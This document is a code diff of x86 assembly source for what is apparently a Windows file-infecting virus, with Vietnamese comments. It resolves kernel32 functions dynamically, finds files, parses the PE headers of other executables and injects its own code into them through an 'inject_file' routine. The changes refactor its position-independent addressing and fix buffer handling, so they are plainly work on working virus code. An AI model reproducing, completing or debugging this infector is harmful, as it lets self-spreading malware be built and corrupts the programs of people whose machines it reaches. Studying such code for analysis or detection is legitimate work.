@@ -120,160 +120,283 @@ pop		eax			;gpa
 pop		edx			;hmodule
 pop		ebp			;delta
 
-mov		[offset kernel32 + ebp], edx
-mov		[offset gpa + ebp], eax
-mov		[offset old + ebp], ecx
-mov		[offset delta + ebp], ebp
+;mov		[offset kernel32 + ebp], edx
+lea		ebx, kernel32
+add		ebx, ebp
+mov		[ebx], edx
+;mov		[offset gpa + ebp], eax
+lea		ebx, gpa
+add		ebx, ebp
+mov		[ebx], eax
+;mov		[offset old + ebp], ecx
+lea		ebx, old
+add		ebx, ebp
+mov		[ebx], ecx
+;mov		[offset delta + ebp], ebp
+lea		ebx, delta
+add		ebx, ebp
+mov		[ebx], ebp
 
 ;Lay ham LoadLibraryA
 mov		eax, offset loadlib
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
 
 push	eax
 push	ebx
 call	ecx
 
-mov		[offset load + ebp], eax
+mov		ecx, offset load
+add		ecx, ebp
+mov		[ecx], eax
 
 
 ;Lay ham FindFirstFile
 mov		eax, offset findfirstfile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
 
 push	eax
 push	ebx
 call	ecx
 
-mov		[offset fff + ebp], eax
+mov		ecx, offset fff
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham FindNextFile
 mov		eax, offset findnextfile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset fnf + ebp], eax
+
+mov		ecx, offset fnf
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham RtlZeroMemory
 mov		eax, offset memsetzero
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset msz + ebp], eax
+
+mov		ecx, offset msz
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham VirtualAlloc
 mov		eax, offset viralloc
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset virAlloc + ebp], eax
+
+mov		ecx, offset virAlloc
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham VirtualFree
 mov		eax, offset virfree
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset virFree + ebp], eax
+
+mov		ecx, offset virFree
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham CreateFile
 mov		eax, offset createfile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset cf + ebp], eax
+
+mov		ecx, offset cf
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham ReadFile
 mov		eax, offset readfile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset rf + ebp], eax
+
+mov		ecx, offset rf
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham WriteFile
 mov		eax, offset writefile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset wf + ebp], eax
+
+mov		ecx, offset wf
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham lstrlen
 mov		eax, offset len
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset strlen + ebp], eax
+
+mov		ecx, offset strlen
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham lstrcpy
 mov		eax, offset cpy
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset strcpy + ebp], eax
+
+mov		ecx, offset strcpy
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham CloseHandle
 mov		eax, offset clshandle
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset clh + ebp], eax
+
+mov		ecx, offset clh
+add		ecx, ebp
+mov		[ecx], eax
+
 ;Lay ham exit
 mov		eax, offset exit
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset exitprocess + ebp], eax
+
+mov		ecx, offset exitprocess
+add		ecx, ebp
+mov		[ecx], eax
 
 ;Lay ham GetModuleFileName
 mov		eax, offset getpathfile
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset gmfn + ebp], eax
+
+mov		ecx, offset gmfn
+add		ecx, ebp
+mov		[ecx], eax
 
 ;goi user32.dll
 
 mov		eax, offset lib_user32
 add		eax, ebp
-mov		ecx, [offset load + ebp]
+mov		ecx, offset load
+add		ecx, ebp
+mov		ecx, [ecx]
 
 push	eax
 call	ecx
@@ -286,37 +409,59 @@ mov		[ecx], eax
 
 mov		eax, offset messagebox
 add		eax, ebp
-mov		ebx, [offset user32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset user32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset mg + ebp], eax
+
+mov		ecx, offset mg
+add		ecx, ebp
+mov		[ecx], eax
 
 
 ;Lay ham GetCurrentDirectoryA
 
 mov		eax, offset getpath
 add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
+mov		ebx, offset kernel32
+add		ebx, ebp
+mov		ebx, [ebx]
+mov		ecx, offset gpa
+add		ecx, ebp
+mov		ecx, [ecx]
+
 push	eax
 push	ebx
 call	ecx
-mov		[offset gcd + ebp], eax
+
+mov		ecx, offset gcd
+add		ecx, ebp
+mov		[ecx], eax
 
 
 
-lea		eax, [offset path + ebp]
+lea		eax, path
+add		eax, ebp
+lea		ebx, gcd
+add		ebx, ebp
+mov		ebx, [ebx]
 push	eax					;path
 push	256					;size
-call	[offset gcd + ebp]			;GetCurrentDirectoryA
+call	ebx			;GetCurrentDirectoryA
 
 lea		ecx, path
 add		ecx, ebp
 
 xor		ebx, ebx
-mov		ebx, [offset delta + ebp]
+mov		ebx, offset delta 
+add		ebx, ebp
+mov		ebx, [ebx]
 ;-----------------------------------------------------------------------------
 push	ebx
 push	ecx								
@@ -392,7 +537,9 @@ push	eax
 push	ecx
 call	ebx
 
-mov		eax, [offset tmp_1+ebp]
+mov		eax, offset tmp_1
+add		eax, ebp
+mov		eax, [eax]
 add		eax, 34h
 
 ;imagebase-----------------
@@ -421,7 +568,9 @@ push	ecx
 call	ebx
 
 ;TLS size------------------
-mov		eax, [offset tmp_1+ebp]
+mov		eax, offset tmp_1
+add		eax, ebp
+mov		eax, [eax]
 add		eax, 0c4h
 
 lea		edx, ovl_g
@@ -484,7 +633,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	LOCAL path_file_current[262]:byte
 	LOCAL inject_tmp:dword
 	LOCAL this_file_virus_handle:dword
-	LOCAL ov[20]:dword
+	LOCAL ov[5]:dword
 	LOCAL numberofsection:word
 	LOCAL nos_injected:word
 	LOCAL aop_virus:dword
@@ -527,8 +676,8 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	80h					;normal
 	push	3					;OPEN_EXISTING
 	push	0
-	push	00000001h			;read va write
-	push	080000000h			;read va write
+	push	00000007h			;read va write
+	push	080000000h			;read
 	push	eax					;pathtmp
 	call	ebx					;CreateFile
 	
@@ -537,9 +686,20 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	je		end_inject_file
 	lea		ecx, this_file_virus_handle
 	mov		[ecx], eax
+	;...
+	xor		ebx, ebx
+	mov		eax, del
+	add		eax, offset msz
+	mov		eax, [eax]
+	mov		ebx, 14h
+	lea		ecx, ov
+
+	push	ebx			;size
+	push	ecx			;buff
+	call 	eax			;call RtlZeroMemory
+	;...
 	xor		ebx, ebx
 	mov		ebx, 60
-	
 	
 	lea		eax, ov
 	add		eax, 8h
@@ -561,7 +721,20 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	eax							;handle
 	call	edx 						;ReadFile
 	
+	;...
+	xor		ebx, ebx
+	mov		eax, del
+	add		eax, offset msz
+	mov		eax, [eax]
+	mov		ebx, 14h
+	lea		ecx, ov
+
+	push	ebx			;size
+	push	ecx			;buff
+	call 	eax			;call RtlZeroMemory
+	;...
 	mov		ebx, inject_tmp
+	
 	lea		eax, ov
 	add		eax, 8h
 	add		ebx, 6h					
@@ -585,7 +758,21 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	eax							;handle
 	call	edx							;ReadFile
 	
+	;...
+	xor		ebx, ebx
+	mov		eax, del
+	add		eax, offset msz
+	mov		eax, [eax]
+	mov		ebx, 14h
+	lea		ecx, ov
+
+	push	ebx			;size
+	push	ecx			;buff
+	call 	eax			;call RtlZeroMemory
+	;...
+	
 	mov		ebx, inject_tmp
+	
 	lea		eax, ov
 	add		eax, 8h
 	add		ebx, 28h					
@@ -634,16 +821,20 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	this_file_virus_handle		;handle
 	call	edx							;ReadFile
 	
+	
 	mov		eax, [section+0ch]
 	mov		ebx, aop_virus
 	pop		edx
 	pop		ecx
 	cmp		eax, ebx
 	ja		finded
+	cmp		eax, 0
+	je		finded
 	add		edx, 40
 	dec		ecx
 	jmp		find_section
 	finded:
+	
 	sub		edx, 40
 	lea		eax, ov
 	add		eax, 8h					
@@ -678,6 +869,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	mov		[ebx], eax
 	
 	;readfile injected
+
 	lea		eax, ov
 	add		eax, 8h					
 	mov		dword ptr [eax], 60
@@ -719,6 +911,8 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	call	edx					;read sectionalignment
 	
 	
+	
+	
 	xor		eax, eax
 	mov		eax, injected
 	add		eax, 3ch
@@ -726,6 +920,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		edx, rf
 	add		edx, del
 	mov		edx, [edx]			; readfile
+	
 	
 	lea		ebx, ov
 	add		ebx, 8
@@ -741,6 +936,8 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	call	edx					;readfile filealignment
 	
 	;doc so section cua file bi lay
+	
+	
 	mov		ebx, injected
 	lea		eax, ov
 	add		eax, 8h	
@@ -763,6 +960,8 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	
 	;doc thong tin section cuoi trong sectiontable
+	
+	
 	xor		eax, eax
 	mov		ax, nos_injected
 	dec		ax
@@ -778,6 +977,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		edx, rf
 	add		edx, del
 	mov		edx, [edx]			; readfile
+	
 	
 	lea		ebx, ov
 	add		ebx, 8
@@ -795,7 +995,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	
 	;Doc AddressOfEntryPoint cua file bi lay
-	
+
 	xor 	eax, eax
 	mov		eax, injected
 	add		eax, 28h
@@ -803,6 +1003,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		ebx, rf
 	add		ebx, del
 	mov		ebx, [ebx]
+	
 	
 	lea		ecx, ov
 	add		ecx, 8
@@ -881,7 +1082,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		edx, wf
 	add		edx, del
 	mov		edx, [edx]			; writefile
-	
+
 	lea		ebx, ov
 	add		ebx, 8
 	mov		[ebx], eax
@@ -1080,7 +1281,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	push	eax
 	push	0
-	push	ecx							;4 byte
+	push	ecx							;raw size byte
 	push	ebx							;buffer
 	push	this_file_virus_handle		;handle
 	call	edx							;ReadFile
@@ -1374,7 +1575,8 @@ mov		ebx, del
 add		ebx, offset h_file
 mov		ebx,[ebx]
 
-push	delta
+
+push	del
 push	ebx
 call 	inject_file
 
